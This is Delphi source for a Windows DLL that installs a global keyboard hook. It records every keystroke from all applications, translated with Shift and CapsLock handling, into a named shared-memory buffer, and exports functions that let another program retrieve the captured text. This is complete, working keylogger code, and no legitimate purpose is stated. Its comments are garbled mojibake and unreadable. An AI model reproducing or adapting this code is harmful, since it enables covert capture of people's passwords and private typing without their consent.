unit U_HookDLL;

interface

uses
  Windows, Messages;

const BUFFER_SIZE = 16 * 1024;              //�ļ�ӳ�䵽�ڴ�Ĵ�С
const HOOK_MEM_FILENAME = 'MEM_FILE';       //ӳ���ļ�����
const HOOK_MUTEX_NAME = 'MUTEX_NAME';       //��������

type
  //�������ݽṹ
  TShared = record
    Keys: array[0..BUFFER_SIZE - 1] of Char;
    KeyCount: Integer;
  end;
  //�������ݽṹָ��
  PShared = ^TShared;

var
  MemFile, HookMutex: THandle;              //�ļ�����ͻ�����
  hOldKeyHook: HHook;                       //���ӱ���
  Shared: PShared;                          //�������

implementation

//���̹��ӻص�����
function KeyHookProc(iCode: Integer; wParam: WPARAM; lParam: LPARAM): LRESULT;
  stdcall; export;
const
  KeyMask = $80000000;
var
  PEvt: ^EventMsg;
  vKey: Integer;
  iCapsLock, iNumLock, iShift: Integer;
  bCapsLock, bNumLock, bShift: Boolean;
begin
  if iCode < 0 then
    Result := CallNextHookEx(hOldKeyHook, iCode, wParam, lParam)
  else
  begin
    if (iCode = HC_ACTION) then
    begin
      //��lParamָ�봫�ݸ�PEvt�¼���Ϣָ��
      PEvt := Pointer(DWord(lParam));

      //�������а�����ѹ��
      if (PEvt.Message = WM_KEYDOWN) then
      begin
        //ȡ��16���������ֽ�����
        vKey := LoByte(PEvt.paramL);
        //��ȡShift����״̬
        iShift := GetKeyState(VK_SHIFT);
        //��ȡCapsLock����״̬
        iCapsLock := GetKeyState(VK_CAPITAL);
        //��ȡNumLock����״̬
        iNumLock := GEtKeyState(VK_NUMLOCK);
        //Shift���Ƿ񱻰���
        bShift := ((iShift and KeyMask) = KeyMask);
        //CapsLock���Ƿ񱻰���
        bCapsLock := (iCapsLock = 1);
        //NumLock���Ƿ񱻰���
        bNumLock := (iNumLock = 1);
      end;

      //Number: 0..9
      if ((vKey >= 48) and (vKey <= 57)) then
      begin
        if (not bShift) then
        begin
          Shared^.Keys[Shared^.KeyCount] := Char(vKey);
          Inc(Shared^.KeyCount);
          //�ﵽ��������������ʱ����
          if Shared^.KeyCount >= BUFFER_SIZE - 1 then
            Shared^.KeyCount := 0;
        end
        else
        begin
          case vKey of
            48:
            begin
              Shared^.Keys[Shared^.KeyCount] := ')';
              Inc(Shared^.KeyCount);
              //�ﵽ��������������ʱ����
              if Shared^.KeyCount >= BUFFER_SIZE - 1 then
                Shared^.KeyCount := 0;
            end;
            49:
            begin
              Shared^.Keys[Shared^.KeyCount] := '!';
              Inc(Shared^.KeyCount);
              //�ﵽ��������������ʱ����
              if Shared^.KeyCount >= BUFFER_SIZE - 1 then
                Shared^.KeyCount := 0;
            end;
            50:
            begin
              Shared^.Keys[Shared^.KeyCount] := '@';
              Inc(Shared^.KeyCount);
              //�ﵽ��������������ʱ����
              if Shared^.KeyCount >= BUFFER_SIZE - 1 then
                Shared^.KeyCount := 0;
            end;
            51:
            begin
              Shared^.Keys[Shared^.KeyCount] := '#';
              Inc(Shared^.KeyCount);
              //�ﵽ��������������ʱ����
              if Shared^.KeyCount >= BUFFER_SIZE - 1 then
                Shared^.KeyCount := 0;
            end;
            52:
            begin
              Shared^.Keys[Shared^.KeyCount] := '$';
              Inc(Shared^.KeyCount);
              //�ﵽ��������������ʱ����
              if Shared^.KeyCount >= BUFFER_SIZE - 1 then
                Shared^.KeyCount := 0;
            end;
            53:
            begin
              Shared^.Keys[Shared^.KeyCount] := '%';
              Inc(Shared^.KeyCount);
              //�ﵽ��������������ʱ����
              if Shared^.KeyCount >= BUFFER_SIZE - 1 then
                Shared^.KeyCount := 0;
            end;
            54:
            begin
              Shared^.Keys[Shared^.KeyCount] := '^';
              Inc(Shared^.KeyCount);
              //�ﵽ��������������ʱ����
              if Shared^.KeyCount >= BUFFER_SIZE - 1 then
                Shared^.KeyCount := 0;
            end;
            55:
            begin
              Shared^.Keys[Shared^.KeyCount] := '&';
              Inc(Shared^.KeyCount);
              //�ﵽ��������������ʱ����
              if Shared^.KeyCount >= BUFFER_SIZE - 1 then
                Shared^.KeyCount := 0;
            end;
            56:
            begin
              Shared^.Keys[Shared^.KeyCount] := '*';
              Inc(Shared^.KeyCount);
              //�ﵽ��������������ʱ����
              if Shared^.KeyCount >= BUFFER_SIZE - 1 then
                Shared^.KeyCount := 0;
            end;
            57:
            begin
              Shared^.Keys[Shared^.KeyCount] := '(';
              Inc(Shared^.KeyCount);
              //�ﵽ��������������ʱ����
              if Shared^.KeyCount >= BUFFER_SIZE - 1 then
                Shared^.KeyCount := 0;
            end;
          end;
        end
      end;

      if ((vKey >= 65) and (vKey <= 90)) then
      begin
        //δ����CapsLock��
        if (not bCapsLock) then
        begin
          //�Ѱ���Shift��
          if (bShift) then
          begin
            Shared^.Keys[Shared^.KeyCount] := Char(vKey);
            Inc(Shared^.KeyCount);
            //�ﵽ��������������ʱ����
            if Shared^.KeyCount >= BUFFER_SIZE - 1 then
              Shared^.KeyCount := 0;
          end
          else
          begin
            Shared^.Keys[Shared^.KeyCount] := Char(vKey + 32);
            Inc(Shared^.KeyCount);
            //�ﵽ��������������ʱ����
            if Shared^.KeyCount >= BUFFER_SIZE - 1 then
              Shared^.KeyCount := 0;
          end
        end
        //�Ѱ���CapsLock��
        else
        begin
          //�Ѱ���Shift��
          if (bShift) then
          begin
            Shared^.Keys[Shared^.KeyCount] := Char(vKey + 32);
            Inc(Shared^.KeyCount);
            //�ﵽ��������������ʱ����
            if Shared^.KeyCount >= BUFFER_SIZE - 1 then
              Shared^.KeyCount := 0;
          end
          else
          begin
            Shared^.Keys[Shared^.KeyCount] := Char(vKey);
            Inc(Shared^.KeyCount);
            //�ﵽ��������������ʱ����
            if Shared^.KeyCount >= BUFFER_SIZE - 1 then
              Shared^.KeyCount := 0;
          end
        end;
      end;

      //С���̵�0..9
      if ((vKey >= 96) and (vKey <= 105)) then
        if bNumLock then
        begin
          Shared^.Keys[Shared^.KeyCount] := Char(vKey - 96 + 48);
          Inc(Shared^.KeyCount);
          //�ﵽ��������������ʱ����
          if Shared^.KeyCount >= BUFFER_SIZE - 1 then
            Shared^.KeyCount := 0;
        end;

      //+-*/
      if ((vKey >= 105) and (vKey <= 111)) then
      begin
        case vKey of
          106:
          begin
            Shared^.Keys[Shared^.KeyCount] := '*';
            Inc(Shared^.KeyCount);
            //�ﵽ��������������ʱ����
            if Shared^.KeyCount >= BUFFER_SIZE - 1 then
              Shared^.KeyCount := 0;
          end;
          107:
          begin
            Shared^.Keys[Shared^.KeyCount] := '+';
            Inc(Shared^.KeyCount);
            //�ﵽ��������������ʱ����
            if Shared^.KeyCount >= BUFFER_SIZE - 1 then
              Shared^.KeyCount := 0;
          end;
          109:
          begin
            Shared^.Keys[Shared^.KeyCount] := '-';
            Inc(Shared^.KeyCount);
            //�ﵽ��������������ʱ����
            if Shared^.KeyCount >= BUFFER_SIZE - 1 then
              Shared^.KeyCount := 0;
          end;
          111:
          begin
            Shared^.Keys[Shared^.KeyCount] := '/';
            Inc(Shared^.KeyCount);
            //�ﵽ��������������ʱ����
            if Shared^.KeyCount >= BUFFER_SIZE - 1 then
              Shared^.KeyCount := 0;
          end;
        end;
      end;

      //�������
      if ((vKey >= 186) and (vKey <= 222)) then
      begin
        //��δ����Shift��
        if (not bShift) then
        begin
          case vKey of
            186:
            begin
              Shared^.Keys[Shared^.KeyCount] := ';';
              Inc(Shared^.KeyCount);
              //�ﵽ��������������ʱ����
              if Shared^.KeyCount >= BUFFER_SIZE - 1 then
                Shared^.KeyCount := 0;
            end;
            187:
            begin
              Shared^.Keys[Shared^.KeyCount] := '=';
              Inc(Shared^.KeyCount);
              //�ﵽ��������������ʱ����
              if Shared^.KeyCount >= BUFFER_SIZE - 1 then
                Shared^.KeyCount := 0;
            end;
            189:
            begin
              Shared^.Keys[Shared^.KeyCount] := ',';
              Inc(Shared^.KeyCount);
              //�ﵽ��������������ʱ����
              if Shared^.KeyCount >= BUFFER_SIZE - 1 then
                Shared^.KeyCount := 0;
            end;
            190:
            begin
              Shared^.Keys[Shared^.KeyCount] := '.';
              Inc(Shared^.KeyCount);
              //�ﵽ��������������ʱ����
              if Shared^.KeyCount >= BUFFER_SIZE - 1 then
                Shared^.KeyCount := 0;
            end;
            191:
            begin
              Shared^.Keys[Shared^.KeyCount] := '/';
              Inc(Shared^.KeyCount);
              //�ﵽ��������������ʱ����
              if Shared^.KeyCount >= BUFFER_SIZE - 1 then
                Shared^.KeyCount := 0;
            end;
            192:
            begin
              Shared^.Keys[Shared^.KeyCount] := '''';
              Inc(Shared^.KeyCount);
              //�ﵽ��������������ʱ����
              if Shared^.KeyCount >= BUFFER_SIZE - 1 then
                Shared^.KeyCount := 0;
            end;
            219:
            begin
              Shared^.Keys[Shared^.KeyCount] := '[';
              Inc(Shared^.KeyCount);
              //�ﵽ��������������ʱ����
              if Shared^.KeyCount >= BUFFER_SIZE - 1 then
                Shared^.KeyCount := 0;
            end;
            220:
            begin
              Shared^.Keys[Shared^.KeyCount] := '\';
              Inc(Shared^.KeyCount);
              //�ﵽ��������������ʱ����
              if Shared^.KeyCount >= BUFFER_SIZE - 1 then
                Shared^.KeyCount := 0;
            end;
            221:
            begin
              Shared^.Keys[Shared^.KeyCount] := ']';
              Inc(Shared^.KeyCount);
              //�ﵽ��������������ʱ����
              if Shared^.KeyCount >= BUFFER_SIZE - 1 then
                Shared^.KeyCount := 0;
            end;
            222:
            begin
              Shared^.Keys[Shared^.KeyCount] := Char(27);
              Inc(Shared^.KeyCount);
              //�ﵽ��������������ʱ����
              if Shared^.KeyCount >= BUFFER_SIZE - 1 then
                Shared^.KeyCount := 0;
            end;
          end;
        end
        else
        begin
          case vKey of
            186:
            begin
              Shared^.Keys[Shared^.KeyCount] := ':';
              Inc(Shared^.KeyCount);
              //�ﵽ��������������ʱ����
              if Shared^.KeyCount >= BUFFER_SIZE - 1 then
                Shared^.KeyCount := 0;
            end;
            187:
            begin
              Shared^.Keys[Shared^.KeyCount] := '+';
              Inc(Shared^.KeyCount);
              //�ﵽ��������������ʱ����
              if Shared^.KeyCount >= BUFFER_SIZE - 1 then
                Shared^.KeyCount := 0;
            end;
            189:
            begin
              Shared^.Keys[Shared^.KeyCount] := '<';
              Inc(Shared^.KeyCount);
              //�ﵽ��������������ʱ����
              if Shared^.KeyCount >= BUFFER_SIZE - 1 then
                Shared^.KeyCount := 0;
            end;
            190:
            begin
              Shared^.Keys[Shared^.KeyCount] := '>';
              Inc(Shared^.KeyCount);
              //�ﵽ��������������ʱ����
              if Shared^.KeyCount >= BUFFER_SIZE - 1 then
                Shared^.KeyCount := 0;
            end;
            191:
            begin
              Shared^.Keys[Shared^.KeyCount] := '?';
              Inc(Shared^.KeyCount);
              //�ﵽ��������������ʱ����
              if Shared^.KeyCount >= BUFFER_SIZE - 1 then
                Shared^.KeyCount := 0;
            end;
            192:
            begin
              Shared^.Keys[Shared^.KeyCount] := '~';
              Inc(Shared^.KeyCount);
              //�ﵽ��������������ʱ����
              if Shared^.KeyCount >= BUFFER_SIZE - 1 then
                Shared^.KeyCount := 0;
            end;
            219:
            begin
              Shared^.Keys[Shared^.KeyCount] := '{';
              Inc(Shared^.KeyCount);
              //�ﵽ��������������ʱ����
              if Shared^.KeyCount >= BUFFER_SIZE - 1 then
                Shared^.KeyCount := 0;
            end;
            220:
            begin
              Shared^.Keys[Shared^.KeyCount] := '|';
              Inc(Shared^.KeyCount);
              //�ﵽ��������������ʱ����
              if Shared^.KeyCount >= BUFFER_SIZE - 1 then
                Shared^.KeyCount := 0;
            end;
            221:
            begin
              Shared^.Keys[Shared^.KeyCount] := '}';
              Inc(Shared^.KeyCount);
              //�ﵽ��������������ʱ����
              if Shared^.KeyCount >= BUFFER_SIZE - 1 then
                Shared^.KeyCount := 0;
            end;
            222:
            begin
              Shared^.Keys[Shared^.KeyCount] := '"';
              Inc(Shared^.KeyCount);
              //�ﵽ��������������ʱ����
              if Shared^.KeyCount >= BUFFER_SIZE - 1 then
                Shared^.KeyCount := 0;
            end;
          end;
        end;
      end;

      if ((vKey >= 8) and (vKey <= 46)) then
      begin
        case vKey of
          8:
            begin
              //Shared^.Keys[Shared^.KeyCount] := '[BACK]';
              Shared^.Keys[Shared^.KeyCount] := #0;
              Inc(Shared^.KeyCount);
              //�ﵽ��������������ʱ����
              if Shared^.KeyCount >= BUFFER_SIZE - 1 then
                Shared^.KeyCount := 0;
            end;
          9:
            begin
              //Shared^.Keys[Shared^.KeyCount] := '[TAB]';
              Shared^.Keys[Shared^.KeyCount] := #0;
              Inc(Shared^.KeyCount);
              //�ﵽ��������������ʱ����
              if Shared^.KeyCount >= BUFFER_SIZE - 1 then
                Shared^.KeyCount := 0;
            end;
          13:
            begin
              //Shared^.Keys[Shared^.KeyCount] := '[ENTER]';
              Shared^.Keys[Shared^.KeyCount] := #0;
              Inc(Shared^.KeyCount);
              //�ﵽ��������������ʱ����
              if Shared^.KeyCount >= BUFFER_SIZE - 1 then
                Shared^.KeyCount := 0;
            end;
          32:
            begin
              //Shared^.Keys[Shared^.KeyCount] := '[SPACE]';
              Shared^.Keys[Shared^.KeyCount] := #0;
              Inc(Shared^.KeyCount);
              //�ﵽ��������������ʱ����
              if Shared^.KeyCount >= BUFFER_SIZE - 1 then
                Shared^.KeyCount := 0;
            end;
          35:
            begin
              //Shared^.Keys[Shared^.KeyCount] := '[END]';
              Shared^.Keys[Shared^.KeyCount] := #0;
              Inc(Shared^.KeyCount);
              //�ﵽ��������������ʱ����
              if Shared^.KeyCount >= BUFFER_SIZE - 1 then
                Shared^.KeyCount := 0;
            end;
          36:
            begin
              //Shared^.Keys[Shared^.KeyCount] := '[HOME]';
              Shared^.Keys[Shared^.KeyCount] := #0;
              Inc(Shared^.KeyCount);
              //�ﵽ��������������ʱ����
              if Shared^.KeyCount >= BUFFER_SIZE - 1 then
                Shared^.KeyCount := 0;
            end;
          37:
            begin
              //Shared^.Keys[Shared^.KeyCount] := '[LF]';
              Shared^.Keys[Shared^.KeyCount] := #0;
              Inc(Shared^.KeyCount);
              //�ﵽ��������������ʱ����
              if Shared^.KeyCount >= BUFFER_SIZE - 1 then
                Shared^.KeyCount := 0;
            end;
          38:
            begin
              //Shared^.Keys[Shared^.KeyCount] := '[UF]';
              Shared^.Keys[Shared^.KeyCount] := #0;
              Inc(Shared^.KeyCount);
              //�ﵽ��������������ʱ����
              if Shared^.KeyCount >= BUFFER_SIZE - 1 then
                Shared^.KeyCount := 0;
            end;
          39:
            begin
              //Shared^.Keys[Shared^.KeyCount] := '[RF]';
              Shared^.Keys[Shared^.KeyCount] := #0;
              Inc(Shared^.KeyCount);
              //�ﵽ��������������ʱ����
              if Shared^.KeyCount >= BUFFER_SIZE - 1 then
                Shared^.KeyCount := 0;
            end;
          40:
            begin
              //Shared^.Keys[Shared^.KeyCount] := '[DF]';
              Shared^.Keys[Shared^.KeyCount] := #0;
              Inc(Shared^.KeyCount);
              //�ﵽ��������������ʱ����
              if Shared^.KeyCount >= BUFFER_SIZE - 1 then
                Shared^.KeyCount := 0;
            end;
          45:
            begin
              //Shared^.Keys[Shared^.KeyCount] := '[INSERT]';
              Shared^.Keys[Shared^.KeyCount] := #0;
              Inc(Shared^.KeyCount);
              //�ﵽ��������������ʱ����
              if Shared^.KeyCount >= BUFFER_SIZE - 1 then
                Shared^.KeyCount := 0;
            end;
          46:
            begin
              //Shared^.Keys[Shared^.KeyCount] := '[DELETE]';
              Shared^.Keys[Shared^.KeyCount] := #0;
              Inc(Shared^.KeyCount);
              //�ﵽ��������������ʱ����
              if Shared^.KeyCount >= BUFFER_SIZE - 1 then
                Shared^.KeyCount := 0;
            end;
        end;
      end;

      {
      if ((lParam and KeyMask) = 0) then
      begin
        //���������Ϣ
        Shared^.Keys[Shared^.KeyCount] := Char(wParam and $00FF);
        Inc(Shared^.KeyCount);
        //�ﵽ��������������ʱ����
        if Shared^.KeyCount >= BUFFER_SIZE - 1 then
          Shared^.KeyCount := 0;
      end;
      }
    end;

    Result := CallNextHookEx(hOldKeyHook, iCode, wParam, lParam);
  end;
end;

//��װ���̹���
function EnableKeyHook: BOOL; export;
begin
  Shared^.KeyCount := 0;

  if hOldKeyHook = 0 then
  begin
    //WH_KEYBOARD:���̹���, KeyHookProc:�ص�����, HInstance:�ص�����ʵ��, �߳�ID
    hOldKeyHook := SetWindowsHookEx(WH_KEYBOARD, KeyHookProc, HInstance, 0);
  end;

  Result := (hOldKeyHook <> 0);
end;

{ж�ؼ��̹���}
function DisableKeyHook: BOOL; export;
begin
  if hOldKeyHook <> 0 then
  begin
    UnHookWindowsHookEx(hOldKeyHook);
    hOldKeyHook := 0;
    Shared^.KeyCount := 0;
  end;

  Result := (hOldKeyHook = 0);
end;

//���ز���İ�������
function GetKeyCount: Integer; export;
begin
  Result := Shared^.KeyCount;
end;

//����ָ������
function GetKey(Index: Integer): Char; export;
begin
  Result := Shared^.Keys[Index];
end;

//��մ�Ű����Ļ�����
procedure ClearKeyString; export;
begin
  Shared^.KeyCount := 0;
end;

//���������б�
exports
  EnableKeyHook,
  DisableKeyHook,
  GetKeyCount,
  ClearKeyString,
  GetKey;

initialization
  //�����������, ֻ����һ������ʹ�ô�DLL
  HookMutex := CreateMutex(nil, True, HOOK_MUTEX_NAME);

  //���ļ�ӳ��
  MemFile := OpenFileMapping(FILE_MAP_WRITE, False, HOOK_MEM_FILENAME);

  //��������ڸ��ļ�ӳ�������´���
  if MemFile = 0 then
    MemFile := CreateFileMapping($FFFFFFFF, nil, PAGE_READWRITE, 0,
      SizeOf(TShared), HOOK_MEM_FILENAME);

  //�ļ�ӳ���ڴ�
  Shared := MapViewOfFile(MemFile, File_MAP_WRITE, 0, 0, 0);

  //�ͷŻ������
  ReleaseMutex(HookMutex);

  //�رջ�����
  CloseHandle(HookMutex);

finalization
  //ж�ؼ��̹���
  if hOldKeyHook <> 0 then
    DisableKeyHook;

  //�ͷ�ӳ��
  UnMapViewOfFile(Shared);

  //�ر�ӳ���ļ����
  CloseHandle(MemFile);

end.